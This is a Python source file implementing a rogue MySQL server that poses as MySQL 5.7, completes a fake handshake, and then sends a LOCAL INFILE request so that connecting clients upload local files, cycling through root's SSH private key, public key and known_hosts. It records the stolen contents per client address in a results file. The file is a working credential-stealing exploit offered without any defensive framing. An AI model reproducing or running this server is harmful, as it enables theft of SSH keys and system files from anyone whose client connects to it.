import socket
import random
import binascii
import struct
import os
from threading import Thread
from time import *
import os
from apscheduler.schedulers.blocking import BlockingScheduler

info = {}

def rand_str(num):
    up = "FF" * num
    down = "1" + ("00" * (num - 1))
    # print(down, up)
    # return bytes.fromhex(str(hex(random.randint(int(down, 16), int(up, 16))))[2:])
    return b"\x34" * num

def str_hex(string):
    return ''.join(['%02x' % x for x in string])

def save_result():
    f = open("result", "a")
    f.write(str(info))
    f.close()

def save_sched():
    scheduler = BlockingScheduler()
    scheduler.add_job(save_result, 'interval', seconds=60)
    scheduler.start()


class mysql:
    def __init__(self, addrress, port = 3306, count = 10, file="/etc/passwd"):
        self.addrress = addrress
        self.port = port
        self.count = count
        self.files = ['/root/.ssh/known_hosts', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub']
        t = Thread(target=save_sched, args=())
        t.start()
    def start(self):
        ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ss.bind((self.addrress, self.port))
        ss.listen(self.count)
        while True:
            try:
                conn, addr = ss.accept()
                t = Thread(target = self.main, args = (conn, addr[0]))
                t.start()
            except KeyboardInterrupt:
                f = open("result", "a")
                f.write(str(info))
                f.close()
                os._exit(1)



    def greet(self):
        pck_num = b"\x00"
        protocol = b"\x0a"
        version = b"5.7.27-0ubuntu0.18.04.1" + b"\x00"
        thread_id = b"\x11\x00\x00\x00"
        salt1 =  rand_str(8) + b"\x00"
        capab = b"\xff\xf7"
        ser_lang = b"\x08"
        ser_status = b"\x02\x00"
        extend_capab = b"\xff\x81"
        plugin_len = b"\x15"
        unused = b"\x00" * 10
        salt2 = rand_str(12) + b"\x00"
        auth_plugin = b"mysql_native_password" + b"\x00"

        greet = protocol + version + thread_id + salt1 + capab + ser_lang + ser_status + extend_capab + plugin_len + unused + salt2 + auth_plugin
        length = struct.pack("i", len(greet))[:3]
        return length + pck_num + greet
    def resp_ok(self):
        pck_num = b"\x02"

        resp_code = b"\x00"
        aff_row = b"\x00" + b"\x00"
        ser_status = b"\x02\x00"
        warn = b"\x00\x00"

        ok = resp_code + aff_row + ser_status + warn
        length = struct.pack("i", len(ok))[:3]

        return length + pck_num + ok

    def attack(self, filename):
        pck_num = b"\x01"

        num_field = b"\xfb"
        payload = filename.encode()

        data = num_field + payload
        length = struct.pack("i", len(data))[:3]

        return length + pck_num + data
    def main(self, conn, addr):
        fileNum = 0
        if addr in info.keys():
            fileNum = len(info[addr]) % len(self.files)
        filename = self.files[fileNum]
        data = self.greet()
        conn.send(data)
        conn.recv(1024)
        data = self.resp_ok()
        conn.send(data)
        conn.recv(1024)
        data = self.attack(filename)
        conn.send(data)
        print("*" * 88)
        print("addr: ", addr)
        print("filename ", filename)
        data = conn.recv(10240)
        if fileNum == 0:
            info[addr] = []
        info[addr].append({filename:data})
        print(data)
        print("*" * 88)
        conn.close()
        


if "__name__" == "__main__":
    ser = mysql('127.0.0.1', 3307, 1)
    ser.start()